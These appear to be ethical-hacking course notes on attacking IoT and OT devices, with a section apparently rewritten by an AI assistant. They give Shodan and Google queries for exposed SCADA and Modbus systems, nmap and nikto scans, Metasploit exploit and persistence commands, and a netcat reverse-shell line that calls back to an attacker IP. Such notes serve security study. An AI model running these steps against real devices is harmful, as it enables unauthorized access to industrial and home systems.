# IoT and OT Hacking
> IoT and OT device hacking is performed to compromise smart devices such as CCTV cameras, automobiles, printers, door locks, washing machines, etc. to gain unauthorized access to network resources as well as IoT and OT devices.


Using the IoT and OT hacking methodology, an attacker acquires information using techniques such as information gathering, attack surface area identification, and vulnerability scanning, and uses such information to hack the target device and network.

footprinting on the MQTT protocol, which is a machine-to-machine (M2M)/“Internet of Things” connectivity protocol. It is useful for connections with remote locations where a small code footprint is required and/or network bandwidth is at a premium.

The following are the various phases of IoT and OT device hacking:

- Information gathering
- Vulnerability scanning
- Launch attacks
- Gain remote access
- Maintain access

Gather Information using Online Footprinting Tools
- The information regarding the target IoT and OT devices can be acquired using various online sources such as Whois domain lookup, advanced Google hacking, and Shodan search engine. The gathered information can be used to scan the devices for vulnerabilities and further exploit them to launch attacks.

- https://www.whois.com/whois/ 
- https://www.exploit-db.com/google-hacking-database     
	- type SCADA
	- "login" intitle:"scada login" 
- https://www.shodan.io/dashboard
	- port:1883
  - Search for Modbus-enabled ICS/SCADA systems:
    - port:502
  - Search for SCADA systems using PLC name:
    - “Schneider Electric”
  - Search for SCADA systems using geolocation:
    - SCADA Country:"US"

Overview of IoT and OT Traffic
- Many IoT devices such as security cameras host websites for controlling or configuring cameras from remote locations. These websites mostly implement the insecure HTTP protocol instead of the secure HTTPS protocol and are, hence, vulnerable to various attacks. If the cameras use the default factory credentials, an attacker can easily intercept all the traffic flowing between the camera and web applications and further gain access to the camera itself. Attackers can use tools such as Wireshark to intercept such traffic and decrypt the Wi-Fi keys of the target network.

---

# IoT and OT Hacking

> [!NOTE]
> The hacking of IoT and OT devices involves multiple phases where attackers seek to exploit vulnerabilities in smart devices and network infrastructure. The methodology extends from information gathering to maintaining persistent access. Below, I will detail this hacking process, including examples of how specific tools and modules within Parrot OS, a popular penetration testing and security-focused distribution, can be utilized to achieve these objectives.
> 
> The various phases of IoT and OT device hacking:
> - Information gathering
> - Vulnerability scanning
> - Launch attacks
> - Gain remote access
> - Maintain access


#### 1. **Information Gathering**
This phase involves collecting as much information as possible about the target devices. This can include details like IP addresses, device types, OS versions, and network configurations.

- **Online Footprinting Tools**:
	- **Whois domain lookup**: Use the `whois` command in your Shell to retrieve information about the domain associated with the target IoT devices.
  
  ```bash
  whois example.com
  ```
  
  
  - **Advanced Google Hacking**: Utilize the Google Hacking Database to find specific queries that can expose sensitive information. Queries can be crafted based on the information in the database:
  
    ```bash
    site:example.com inurl:admin
    ```
  
  
- Shodan Search:
	 - Using Shodan command-line interface, you can perform network searches to find IoT devices:

```bash
    shodan search port:1883
    shodan search port:502
    shodan search "Schneider Electric"
```


#### 2. **Vulnerability Scanning**
After gathering the necessary information, the next step is to identify vulnerabilities that can be exploited.

- **Nmap**: This tool can scan for open ports and detect services running on IoT devices.

  ```bash
  sudo nmap -sV -p 1883,502 <target-ip>
  ```


- **Nikto**: A web server scanner that can detect outdated software and potential vulnerabilities.

  ```bash
  nikto -h http://<target-ip>
  ```


#### 3. **Launch Attacks**
With the vulnerabilities identified, attackers can launch targeted attacks against the devices.

- **Metasploit**: A popular framework for developing and executing exploit code against a remote target machine.

  ```bash
  msfconsole
  use exploit/multi/http/cctv_cam_xss
  set RHOSTS <target-ip>
  exploit
  ```


#### 4. **Gain Remote Access**
The objective here is to exploit vulnerabilities to gain control over the device or network.

- **Reverse Shell**: Establish a reverse shell to control the device using netcat or a Metasploit payload.

  ```bash
  nc -lvnp 4444 # Listening on the attacker machine
  nc <attacker-ip> 4444 -e /bin/bash # From the target device
  ```


#### 5. **Maintain Access**
The final goal is to ensure persistent access to the exploited system, even after a reboot or other disruptions.

- **Persistent Backdoors**:
  - **Metasploit** provides multiple modules for establishing persistent access.
  
    ```bash
    use exploit/windows/local/persistence
    set SESSION <session-id>
    exploit
    ```


#### Overview of IoT and OT Traffic Monitoring
- **Wireshark**: Capture and analyse packets to intercept unencrypted data such as HTTP traffic from IoT devices.

  ```bash
  sudo wireshark
  ```

  - Analyse packets for default credentials or unencrypted data flowing between IoT devices and control systems.

This rewritten guide with Parrot OS tools provides a more detailed and practical approach for hacking IoT and OT devices by leveraging commonly used tools in cybersecurity practices. Each tool and command line provided can be tailored to specific targets or scenarios as required in real-world penetration testing.